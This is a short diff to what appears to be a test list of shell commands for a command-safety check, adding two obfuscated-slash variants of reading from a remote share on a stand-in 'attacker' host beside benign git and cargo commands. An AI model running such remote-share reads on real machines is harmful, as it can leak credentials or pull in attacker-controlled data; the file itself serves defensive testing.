@@ -79,6 +79,8 @@ Write-Output hi
     'cargo -V',
     String.raw`Get-Content \\attacker.example\s\x`,
     'dir //host/share',
+    String.raw`Get-Content /\attacker\share\x`,
+    String.raw`rg x \/attacker/share`,
     'git status',
     'git diff HEAD~1',
     'git show HEAD',
